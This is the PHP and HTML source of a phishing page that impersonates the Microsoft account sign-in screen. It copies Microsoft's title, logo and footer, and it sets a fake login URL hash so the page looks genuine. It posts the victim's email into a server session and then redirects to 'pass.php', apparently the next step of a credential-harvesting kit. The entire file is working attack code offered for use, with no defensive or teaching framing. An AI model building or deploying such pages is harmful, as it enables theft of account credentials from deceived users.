<?php
session_start();

require 'api.php';

if(isset($_POST['user'])) {
    $_SESSION['email'] = $_POST['user'];

    print json_encode(['success' => true]);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in to your Microsoft account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon.ico">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/login.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    <img src="assets/images/logo.svg">
                    <h4>Sign In</h4>
                    <form method="POST">
                        <div class="form-group">
                            <input type="email" class="form-control" id="user" name="user" placeholder="Email, phone, or Skype" value="" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required>
                            <p>No account? <a href="#">Create one!</a></p>
                        </div>
                        <button type="submit" class="btn float-right">Next</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>Privacy & cookies</p>
    <p>Terms of use</p>
    <p>©<?php echo date('Y'); ?> Microsoft</p>
</div>

<script>
    location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

    $(function() {
        $(document).on('focus', '.form-control', function() {
            $(this).css({'border-bottom': '1px solid #0067b8'});
        });

        $(document).on('blur', '.form-control', function() {
            $(this).css({'border-bottom': ''});
        });

        $(document).on('submit', 'form', function(event) {
            event.preventDefault();

            var user = $('#user').val();
            
            $.post('<?php echo $_SERVER['PHP_SELF'] ?>', {user: user}, function(data) {
                data = JSON.parse(data);

                if(data.success == true) {
                    window.location = 'pass.php';
                }
            });
        });
    });
</script>

</body>
</html>
